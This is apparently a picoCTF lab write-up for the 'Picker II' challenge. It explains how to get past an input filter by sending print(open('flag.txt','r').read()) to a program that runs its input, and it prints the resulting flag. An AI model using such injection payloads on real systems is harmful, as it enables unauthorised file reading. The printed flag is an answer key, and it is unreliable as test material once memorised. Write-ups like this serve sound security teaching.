# Description

Can you figure out how this program works to get the <br>
flag? <br>
Connect to the program with netcat: <br>
$ nc saturn.picoctf.net 56771 <br>
The program's source code can be downloaded here.

# Solution

```wget https://artifacts.picoctf.net/c/523/picker-II.py```

When looking at the code, ```cat picker-II.py```, you can see the differenc is that it has a filter to prevent someone from putting in "win" and being directed to that function to get the flag.

![image](https://github.com/noamgariani11/picoGym-Exclusive/assets/91398631/cd4481a6-3b16-40e7-9896-86c334a10042)

The hint implies that the input to the program could be something that was done in the win fucntion. The very first line in the win function and the one that reads it is this:

```flag = open('flag.txt', 'r').read()```

Since it needs to be all on one line to get the flag the value could just be printed:

```print(open('flag.txt', 'r').read())```

By connecting to the server, ```nc saturn.picoctf.net 56771```, and inputting that string the flag could be retreived.

Flag: ```picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc3...44590}```
